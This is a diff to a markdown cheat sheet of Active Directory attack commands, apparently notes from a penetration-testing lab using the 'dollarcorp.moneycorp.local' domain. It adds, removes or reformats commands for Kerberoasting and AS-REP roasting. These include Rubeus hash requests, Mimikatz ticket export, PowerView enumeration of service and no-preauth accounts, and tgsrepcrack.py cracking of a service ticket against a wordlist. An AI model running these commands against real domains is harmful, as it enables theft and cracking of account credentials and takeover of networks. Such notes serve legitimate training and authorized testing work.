@@ -105,7 +105,6 @@ Get-DomainUser -SPN | select samaccountname,serviceprincipalname
 
 ```
 Rubeus.exe kerberoast /stats
-Rubeus.exe kerberoast /format:hashcat
 ```
 
 #### Reguest a TGS
@@ -141,7 +140,7 @@ Invoke-Mimikatz -Command '"Kerberos::list /export"'
 ```
 
 #### Crack the ticket
-Crack the password for the serviceaccount
+- Crack the password for the serviceaccount
 ```
 python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-student1@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
 ```
@@ -174,10 +173,6 @@ Set-DomainObject -Identity <username> -Set @{serviceprincipalname=’<ops/whatev
 ## AS-REP Roasting
 #### Enumerating accounts with kerberos preauth disabled
 ```
-. .\Powerview_dev.ps1
-Get-DomainUser -PreauthNotRequired -Verbose
-```
-```
 Get-DomainUser -PreauthNotRequired -verbose | select samaccountname
 ```
 
@@ -190,6 +185,7 @@ Get-ASREPHash -Username <username> -Verbose
 #### Request encrypted AS-REP with rubeus
 ```
 .\rubeus.exe asreproast /format:hashcat
+.\rubeus.exe asreproast /format:hashcat /user:<USER>
 ```
 
 #### Enumerate all users with kerberos preauth disabled and request a hash
